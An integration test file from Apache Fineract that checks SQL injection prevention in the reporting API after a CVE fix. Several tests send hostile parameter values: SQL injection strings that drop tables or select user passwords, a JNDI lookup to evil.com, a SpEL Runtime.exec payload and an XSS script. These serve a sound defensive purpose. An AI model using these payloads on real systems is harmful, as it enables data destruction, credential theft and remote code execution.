/**
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements. See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership. The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License. You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied. See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
package org.apache.fineract.integrationtests;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import lombok.extern.slf4j.Slf4j;
import org.apache.fineract.integrationtests.client.feign.helpers.FeignRawHttpHelper;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * Comprehensive integration tests for SQL injection prevention in reporting functionality (PS-2667).
 *
 * Tests the migration from ESAPI to native database escaping and validates that CVE-2025-5878 is fixed. Covers
 * ReadReportingServiceImpl security measures through actual API endpoints.
 */
@Slf4j
public class SqlInjectionReportingServiceIntegrationTest {

    private static final String NOT_FOUND = "404";
    private Long testReportId = null;
    private Long booleanReportId = null;
    private static final String TEST_REPORT_NAME = "SQL_Injection_Test_Report";
    private static final String TEST_REPORT_SQL = "SELECT 1 as test_column, 'Test Data' as test_name";
    private static final String BOOLEAN_REPORT_SQL = "SELECT (1 = 1) AS active";
    private String booleanReportName;

    @BeforeEach
    public void setup() {
        Locale.setDefault(Locale.ENGLISH);
        // Create test report for the tests
        createTestReportIfNotExists();
    }

    @AfterEach
    public void cleanup() {
        // Clean up test report after tests
        if (testReportId != null) {
            try {
                deleteReport(testReportId);
            } catch (Exception e) {
                log.warn("Failed to clean up test report: {}", e.getMessage());
            } finally {
                testReportId = null;
            }
        }
        if (booleanReportId != null) {
            try {
                deleteReport(booleanReportId);
            } catch (Exception e) {
                log.warn("Failed to clean up boolean test report: {}", e.getMessage());
            } finally {
                booleanReportId = null;
                booleanReportName = null;
            }
        }
    }

    private void createTestReportIfNotExists() {
        try {
            String existingReports = FeignRawHttpHelper.get("/reports");
            if (existingReports.contains("\"reportName\":\"" + TEST_REPORT_NAME + "\"")) {
                log.info("Test report '{}' already exists", TEST_REPORT_NAME);
                Pattern p = Pattern.compile("\"id\":(\\d+)[^}]*\"reportName\":\"" + TEST_REPORT_NAME + "\"");
                Matcher m = p.matcher(existingReports);
                if (m.find()) {
                    testReportId = Long.parseLong(m.group(1));
                    log.info("Found existing test report with ID: {}", testReportId);
                }
                return;
            }
        } catch (RuntimeException e) {
            log.debug("Report list fetch failed, will try to create report: {}", e.getMessage());
        }
        // Create the test report
        String reportJson = "{" + "\"reportName\": \"" + TEST_REPORT_NAME + "\"," + "\"reportType\": \"Table\","
                + "\"reportCategory\": \"Client\"," + "\"reportSql\": \"" + TEST_REPORT_SQL + "\","
                + "\"description\": \"Test report for SQL injection prevention tests\"," + "\"useReport\": true" + "}";

        try {
            String response = FeignRawHttpHelper.post("/reports", reportJson);
            if (response.contains("resourceId")) {
                testReportId = Long.parseLong(response.replaceAll(".*\"resourceId\":(\\d+).*", "$1"));
                log.info("Created test report with ID: {}", testReportId);
            } else {
                throw new RuntimeException("Test report creation failed - no resourceId in response: " + response);
            }
        } catch (RuntimeException e) {
            // This is a critical failure - tests cannot proceed without the test report
            throw new RuntimeException(
                    "CRITICAL: Could not create test report '" + TEST_REPORT_NAME + "'. Tests cannot proceed. Error: " + e.getMessage(), e);
        }
    }

    private void createBooleanReport() {
        booleanReportName = "BOOLEAN_Runreports_Test_Report_" + UUID.randomUUID();

        String reportJson = "{" + "\"reportName\": \"" + booleanReportName + "\"," + "\"reportType\": \"Table\","
                + "\"reportCategory\": \"Client\"," + "\"reportSql\": \"" + BOOLEAN_REPORT_SQL + "\","
                + "\"description\": \"Test report for BOOLEAN runreports support\"," + "\"useReport\": true" + "}";

        String response = FeignRawHttpHelper.post("/reports", reportJson);
        if (response.contains("resourceId")) {
            booleanReportId = Long.parseLong(response.replaceAll(".*\"resourceId\":(\\d+).*", "$1"));
            log.info("Created BOOLEAN test report with ID: {}, name: {}", booleanReportId, booleanReportName);
        } else {
            throw new RuntimeException("BOOLEAN test report creation failed - no resourceId in response: " + response);
        }
    }

    private void deleteReport(Long reportId) {
        if (reportId == null) {
            return;
        }
        try {
            FeignRawHttpHelper.delete("/reports/" + reportId);
            log.info("Deleted test report with ID: {}", reportId);
        } catch (RuntimeException e) {
            // Treat an already-absent report (404) as successfully cleaned up
            if (e.getMessage() != null && e.getMessage().contains(NOT_FOUND)) {
                log.info("Test report with ID {} already absent", reportId);
                return;
            }
            throw new RuntimeException("Failed deleting test report with ID " + reportId, e);
        }
    }

    /**
     * UC1: Test legitimate report execution works correctly Validates that the SQL injection prevention doesn't break
     * normal functionality
     */
    @Test
    void uc1_testLegitimateReportExecution() {
        log.info("Testing that legitimate reports still work after SQL injection prevention");

        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1");

        // Test with the test report we created in setup - this MUST succeed
        String response = FeignRawHttpHelper
                .get("/runreports/" + TEST_REPORT_NAME + "?genericResultSet=false&" + toQueryString(queryParams));

        assertNotNull(response);
        assertNotEquals("", response.trim());

        log.info("Response from report execution: {}", response);

        // Verify response is valid JSON structure
        assertTrue(response.contains("columnHeaders") || response.contains("data") || response.contains("test_column"),
                "Response should contain expected JSON structure, but got: " + response);
    }

    /**
     * UC2: Test parameter injection through query parameters Validates that malicious content in query parameters is
     * also properly handled
     */
    @Test
    void uc2_testParameterInjectionPrevention() {
        log.info("Testing parameter injection prevention through query parameters");

        Map<String, String> maliciousParams = new HashMap<>();
        maliciousParams.put("R_officeId", "1'; DROP TABLE m_office; --");
        maliciousParams.put("R_startDate", "2023-01-01' UNION SELECT * FROM m_appuser --");
        maliciousParams.put("R_endDate", "2023-12-31'); DELETE FROM stretchy_report; --");

        // Test with legitimate report name but malicious parameters
        // This should either succeed with empty/safe results or fail with validation error
        // but NOT with SQL syntax errors
        try {
            FeignRawHttpHelper.get("/runreports/" + TEST_REPORT_NAME + "?genericResultSet=false&" + toQueryString(maliciousParams));
            // If we get here, the SQL injection was prevented and handled safely
            log.info("SQL injection prevented - query executed safely with malicious parameters");
        } catch (RuntimeException exception) {
            assertNoSqlError(exception);
            // Should be a validation error, not a 404
            assertFalse(exception.getMessage().contains(NOT_FOUND),
                    "Should not get 404 - report should exist. Got: " + exception.getMessage());
            log.info("Got expected validation error: {}", exception.getMessage());
        }
    }

    /**
     * UC3: Test type validation whitelist - only 'report' and 'parameter' types should be allowed This validates the
     * whitelist implementation for report types
     */
    @ParameterizedTest(name = "Report Type Validation: {0}")
    @ValueSource(strings = { "report", "parameter" })
    void uc3_testValidReportTypes(String validType) {
        log.info("Testing valid report type: {}", validType);

        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1");

        // Test that valid report types work through the API
        try {
            FeignRawHttpHelper
                    .get("/runreports/TestReport?reportType=" + validType + "&genericResultSet=false&" + toQueryString(queryParams));
            // Should get a proper response or 404 (report not found), not validation error
        } catch (RuntimeException e) {
            // For valid types, we expect 404 (report not found), not validation errors
            assertTrue(e.getMessage().contains(NOT_FOUND));
        }
    }

    /**
     * UC4: Test invalid report types that should be rejected by whitelist
     */
    @ParameterizedTest(name = "Invalid Report Type: {0}")
    @ValueSource(strings = { "table", "view", "procedure", "function", "schema", "database", "admin", "user", "system", "config" })
    void uc4_testInvalidReportTypes(String invalidType) {
        log.info("Testing invalid report type: {}", invalidType);

        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1");

        // These should be rejected and result in 404 (report not found) or validation error
        RuntimeException exception = assertThrows(RuntimeException.class, () -> FeignRawHttpHelper
                .get("/runreports/TestReport?reportType=" + invalidType + "&genericResultSet=false&" + toQueryString(queryParams)));

        // Should get 404 or validation error, not SQL execution error
        assertTrue(exception.getMessage().contains(NOT_FOUND) || exception.getMessage().contains("validation"));
        assertFalse(exception.getMessage().toLowerCase().contains("sql syntax"));
    }

    /**
     * UC5: Test database-specific escaping through API behavior for MySQL/MariaDB
     */
    @Test
    void uc5_testMySQLEscapingThroughAPI() {
        log.info("Testing MySQL/MariaDB escaping behavior through API");

        // Test MySQL special characters in parameters
        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1' OR '1'='1");
        queryParams.put("R_clientId", "1; DROP TABLE m_client;");
        queryParams.put("R_startDate", "2023-01-01\\' OR 1=1 --");

        // Use the real test report to ensure SQL injection prevention works with actual queries
        try {
            String response = FeignRawHttpHelper
                    .get("/runreports/" + TEST_REPORT_NAME + "?genericResultSet=false&" + toQueryString(queryParams));
            // If successful, the special characters were safely escaped
            assertNotNull(response);
            log.info("MySQL/MariaDB special characters safely escaped");
        } catch (RuntimeException e) {
            // Should not get SQL syntax errors - only validation errors
            assertNoSqlError(e);
            log.info("MySQL/MariaDB escaping prevented SQL injection with validation error");
        }
    }

    /**
     * UC6: Test database-specific escaping through API for PostgreSQL
     */
    @Test
    void uc6_testPostgreSQLEscapingThroughAPI() {
        log.info("Testing PostgreSQL escaping behavior through API");

        // Test PostgreSQL-specific SQL injection patterns
        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1'::text OR '1'='1");
        queryParams.put("R_clientId", "1; DROP TABLE m_client CASCADE;");
        queryParams.put("R_startDate", "2023-01-01'::date OR TRUE --");
        queryParams.put("R_endDate", "$$; DROP TABLE m_client; $$");

        // Use the real test report to ensure SQL injection prevention works
        try {
            String response = FeignRawHttpHelper
                    .get("/runreports/" + TEST_REPORT_NAME + "?genericResultSet=false&" + toQueryString(queryParams));
            // If successful, the PostgreSQL special syntax was safely escaped
            assertNotNull(response);
            log.info("PostgreSQL special characters and syntax safely escaped");
        } catch (RuntimeException e) {
            // Should not get SQL syntax errors - only validation errors
            assertNoSqlError(e);
            assertFalse(e.getMessage().toLowerCase().contains("error") && e.getMessage().toLowerCase().contains("position"),
                    "Should not get PostgreSQL position error. Got: " + e.getMessage());
            log.info("PostgreSQL escaping prevented SQL injection with validation error");
        }
    }

    /**
     * UC7: Test concurrent access to ensure thread safety through API
     */
    @Test
    void uc7_testConcurrentAccess() throws InterruptedException, ExecutionException {
        log.info("Testing concurrent access to SQL injection prevention through API");

        int threadCount = 5;
        int operationsPerThread = 3;
        ExecutorService executor = Executors.newFixedThreadPool(threadCount);

        List<Future<Boolean>> futures = new ArrayList<>();

        for (int i = 0; i < threadCount; i++) {
            final int threadId = i;
            Future<Boolean> future = executor.submit(new Callable<Boolean>() {

                @Override
                public Boolean call() {
                    try {
                        for (int j = 0; j < operationsPerThread; j++) {
                            String input = "test-input-" + threadId + "-" + j;

                            Map<String, String> queryParams = new HashMap<>();
                            queryParams.put("R_officeId", "1");

                            FeignRawHttpHelper.get("/runreports/" + URLEncoder.encode(input, StandardCharsets.UTF_8)
                                    + "?genericResultSet=false&" + toQueryString(queryParams));
                        }
                        return true;
                    } catch (RuntimeException e) {
                        // 404 is expected for non-existent reports
                        if (e.getMessage() != null && e.getMessage().contains(NOT_FOUND)) {
                            return true;
                        }
                        log.error("Error in thread {}: {}", threadId, e.getMessage());
                        return false;
                    }
                }
            });
            futures.add(future);
        }

        executor.shutdown();
        assertTrue(executor.awaitTermination(60, TimeUnit.SECONDS), "All threads should complete within 60 seconds");

        for (Future<Boolean> future : futures) {
            assertTrue(future.get(), "All concurrent operations should succeed or return 404");
        }

        log.info("Concurrent access test completed successfully with {} threads and {} operations per thread", threadCount,
                operationsPerThread);
    }

    /**
     * UC8: Test report parameter injection with complex nested structures
     */
    @Test
    void uc8_testComplexParameterInjection() {
        log.info("Testing complex parameter injection scenarios");

        // Test various parameter injection patterns that were historically problematic
        Map<String, String> maliciousParams = new HashMap<>();
        maliciousParams.put("R_officeId", "1) UNION SELECT username,password FROM m_appuser WHERE id=1--");
        maliciousParams.put("R_clientId", "${jndi:ldap://evil.com/a}");
        maliciousParams.put("R_startDate", "'; DROP TABLE IF EXISTS test; --");
        maliciousParams.put("R_endDate", "#{T(java.lang.Runtime).getRuntime().exec('whoami')}");
        maliciousParams.put("R_userId", "<script>alert('xss')</script>");

        try {
            FeignRawHttpHelper.get("/runreports/" + TEST_REPORT_NAME + "?genericResultSet=false&" + toQueryString(maliciousParams));
            // If we get here without exception, the response should be safe
            log.info("Complex parameter injection prevented - query executed safely");
        } catch (RuntimeException e) {
            // Should get parameter validation error, not SQL injection
            assertNoSqlError(e);
            assertFalse(e.getMessage().toLowerCase().contains("table") && e.getMessage().toLowerCase().contains("exist"),
                    "Should not get table exists error. Got: " + e.getMessage());
        }
    }

    /**
     * UC9: Test legitimate reports with various parameter types
     */
    @ParameterizedTest(name = "Parameter Type: {0}")
    @CsvSource(delimiterString = " | ", value = { "R_officeId | 1 | Numeric parameter", "R_startDate | 2023-01-01 | Date parameter",
            "R_endDate | 2023-12-31 | Date parameter", "R_currencyId | USD | String parameter", "R_loanProductId | 1 | Numeric parameter" })
    void uc9_testLegitimateParameterTypes(String paramName, String paramValue, String description) {
        log.info("Testing legitimate parameter: {} = {} ({})", paramName, paramValue, description);

        Map<String, String> queryParams = new HashMap<>();
        queryParams.put(paramName, paramValue);

        try {
            String response = FeignRawHttpHelper
                    .get("/runreports/" + TEST_REPORT_NAME + "?genericResultSet=false&" + toQueryString(queryParams));

            // Valid parameters should return data successfully
            assertNotNull(response);

            // Should not contain SQL error indicators
            assertFalse(response.toLowerCase().contains("syntax error"));
            assertFalse(response.toLowerCase().contains("sql exception"));

            log.debug("Legitimate parameter '{}' = '{}' processed successfully", paramName, paramValue);
        } catch (RuntimeException e) {
            // For legitimate parameters, we should not get errors unless it's a data issue
            // But definitely not SQL syntax errors
            assertNoSqlError(e);
            log.info("Parameter validation for '{}' = '{}': {}", paramName, paramValue, e.getMessage());
        }
    }

    /**
     * UC10: Test cross-database compatibility through API
     */
    @Test
    void uc10_testCrossDatabaseCompatibility() {
        log.info("Testing cross-database compatibility for SQL injection prevention through API");

        String testInput = "test-input-with-special-chars";

        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1");

        try {
            FeignRawHttpHelper.get("/runreports/" + URLEncoder.encode(testInput, StandardCharsets.UTF_8) + "?genericResultSet=false&"
                    + toQueryString(queryParams));
        } catch (RuntimeException e) {
            assertTrue(e.getMessage().contains(NOT_FOUND) || e.getMessage().contains("400"),
                    "Expected safe failure (404/400), but got: " + e.getMessage());
            assertFalse(e.getMessage().toLowerCase().contains("syntax error"));
            assertFalse(e.getMessage().toLowerCase().contains("sql"));

            log.info("Cross-database compatibility test passed - got expected safe response");
        }
    }

    @Test
    void shouldExecuteReportSuccessfullyWhenReportContainsBooleanColumn() {
        createBooleanReport();
        assertNotNull(booleanReportId, "BOOLEAN test report should be created before execution");
        assertNotNull(booleanReportName, "BOOLEAN test report name should be initialized");

        // A successful run returns the body; a non-2xx status throws and fails the test
        String response = FeignRawHttpHelper
                .get("/runreports/" + URLEncoder.encode(booleanReportName, StandardCharsets.UTF_8) + "?genericResultSet=false");

        assertNotNull(response);
        assertFalse(response.isBlank());
        assertFalse(response.contains("Data type 'BOOLEAN' is not supported"));
        assertTrue(response.toLowerCase().contains("active"),
                "Response should contain boolean column alias 'active', but was: " + response);
        assertTrue(response.toLowerCase().contains("true") || response.toLowerCase().contains("1"),
                "Response should contain boolean value (true/1), but was: " + response);
    }

    private void assertNoSqlError(RuntimeException exception) {
        assertFalse(exception.getMessage().toLowerCase().contains("syntax error"),
                "Should not get SQL syntax error, got: " + exception.getMessage());
        assertFalse(exception.getMessage().toLowerCase().contains("you have an error in your sql"),
                "Should not get SQL error, got: " + exception.getMessage());
    }

    /**
     * Helper method to convert parameters map to query string
     */
    private String toQueryString(Map<String, String> params) {
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, String> entry : params.entrySet()) {
            if (sb.length() > 0) {
                sb.append("&");
            }
            sb.append(entry.getKey()).append("=");
            if (entry.getValue() != null) {
                sb.append(URLEncoder.encode(entry.getValue(), StandardCharsets.UTF_8));
            }
        }
        return sb.toString();
    }
}
